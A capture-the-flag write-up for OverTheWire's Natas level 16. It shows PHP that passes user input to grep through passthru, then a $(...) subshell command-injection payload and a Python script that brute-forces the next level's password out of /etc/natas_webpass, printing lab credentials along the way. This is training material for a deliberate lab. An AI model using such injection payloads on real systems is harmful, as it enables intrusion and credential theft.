# Solution
The level has multiple character blacklisted, leaving us with subshell:
```php
<?  
$key = "";  
  
if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];  
}  
  
if($key != "") {  
    if(preg_match('/[;|&`\'"]/',$key)) {  
        print "Input contains an illegal character!";  
    } else {        passthru("grep -i \"$key\" dictionary.txt");  
    }  
}  
?>
```

The logic is that, if we have a NULL return in the subshell, any following character is used for the grep command.
```
$(wasdg)America
```

But if we have a valid value returned from the subshell like:
```
$(whoami)America
```

it would be (example) => www-dataAmerica. Which obviously does not exist.

We can use this to perform a password bruteforce with grep:
```python
import requests

url = "http://natas16.natas.labs.overthewire.org"
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

for i in range(1, 33):
    for c in charset:
        injection = f'$(grep ^{password + c} /etc/natas_webpass/natas17)'
        params = {"needle": injection, "submit": "Search"}

        response = requests.get(url, auth=auth, params=params)

        if "America" not in response.text:
            password += c
            print(f"Found character {i}: {c}")
            break

print(f"Recovered password: {password}")
```

```
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```